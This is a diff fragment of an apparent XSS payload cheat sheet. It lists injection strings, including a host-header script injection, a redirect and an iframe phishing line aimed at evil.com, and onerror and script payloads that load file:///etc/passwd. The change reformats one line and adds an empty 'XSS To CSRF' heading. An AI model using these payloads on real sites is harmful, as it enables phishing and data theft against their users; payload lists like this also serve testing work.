@@ -149,7 +149,7 @@
     add referer: batman 
     hostheader: bing.com">script>alert(document.domain)</script><"
     - URL redirection through xss
-    document.location.href="http://evil.com"
+    - document.location.href="http://evil.com"
     - phishing through xss - iframe injection
     <iframe src="http://evil.com" height="100" width="100"></iframe>
     - Cookie stealing through xss
@@ -173,6 +173,8 @@
     
     <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
     <script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+    # XSS To CSRF 
+        
     ```
     
 - **XSS Polygots**
